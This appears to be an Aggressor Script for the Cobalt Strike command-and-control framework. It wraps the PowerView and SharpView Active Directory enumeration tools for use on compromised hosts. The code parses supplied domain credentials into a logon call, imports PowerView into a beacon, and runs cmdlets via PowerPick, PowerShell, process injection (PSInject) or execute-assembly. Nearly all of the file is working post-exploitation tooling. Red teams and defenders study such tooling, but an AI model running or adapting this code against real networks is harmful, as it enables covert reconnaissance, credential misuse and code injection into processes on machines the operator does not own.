#If you need to change the location of the PowerView script or SharpView assembly
$powerviewlocation = script_resource("PowerView.ps1");
$sharpviewlocation = script_resource("SharpView.exe");

#----------------
#Script handlers
#----------------
sub credentialhandler{
    local('$bid $cred $domain $user $password');
    $bid = $1;
    $cred = $2;
    #For now the credential format is Domain\Username Password
    #May offer the ability to parse other formats in the future
    #TODO:
    #  PTH, PTT
    ($domain, $usps) = split("\\\\", $cred);
    ($user, $password) = split(" ", $usps);
    bloginuser($bid, $domain, $user, $password);
}

sub checkpowerview {
    local('$cmdlet');
    if (data_query('cmdlets')[$1] ne $null) {
        $cmdlet = data_query('cmdlets')[$1];
        #Three random functions from PowerView that if they're all there then its assumed it's imported
        if(("Get-DomainController" in $cmdlet) && ("Export-PowerViewCSV" in $cmdlet) && ("Get-DomainGPO" in $cmdlet)){
        }
        else{
            bpowershell_import($1, $powerviewlocation);
        }
    } 
    else {
        bpowershell_import($1, $powerviewlocation);
    }   
}

sub exechandler{
    local('$bid $cmdargs $cmdlet $arch $pid');
    $bid = $1;
    $cmdlet = $2;
    $execmethod = $3['execmethod'];
    $cmdargs = "";
    
    foreach $key => $value ($3){
        if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod" && $key ne "Credential"){
            $cmdargs .= ' -';
            $cmdargs .= $key;
            $cmdargs .= ' ';
            $cmdargs .= $value;
        }
        else if ($value eq "true"){
            $cmdargs .= ' -';
            $cmdargs .= $key;
        }
    }
    if($3['Credential']){
        &credentialhandler($bid, $3['Credential']);
    }

    if (($execmethod eq "PowerPick") || ($execmethod eq "PowerShell") || ($execmethod eq "PSInject")){
        &checkpowerview($bid);
    }
    if($execmethod eq "PowerPick"){
        btask($bid, "" . dstamp(ticks()) . " - Executing PowerView $cmdlet via PowerPick");
        bpowerpick($bid, "$cmdlet"."$cmdargs");
    }
    else if ($3["execmethod"] eq "PowerShell"){
        btask($bid, "" . dstamp(ticks()) . " - Executing PowerView $cmdlet via PowerShell");
        bpowershell($bid, "$cmdlet"."$cmdargs");
    }
    else if ($3["execmethod"] eq "PSInject"){
        $arch = "x86";
        $pid = bdata($bid)['pid'];
        if(-is64 $bid){
            $arch = "x64";
        }
        btask($bid, "" . dstamp(ticks()) . " - Executing PowerView $cmdlet via PSInject");
        bpsinject($bid, $pid, $arch, "$cmdlet"."$cmdargs");
    }
    else if ($3["execmethod"] eq "Execute-Assembly"){
        btask($bid, "" . dstamp(ticks()) . " - Executing SharpView $cmdlet via Execute-Assembly");
        bexecute_assembly($bid, $sharpviewlocation, "$cmdlet"."$cmdargs");
    }
}

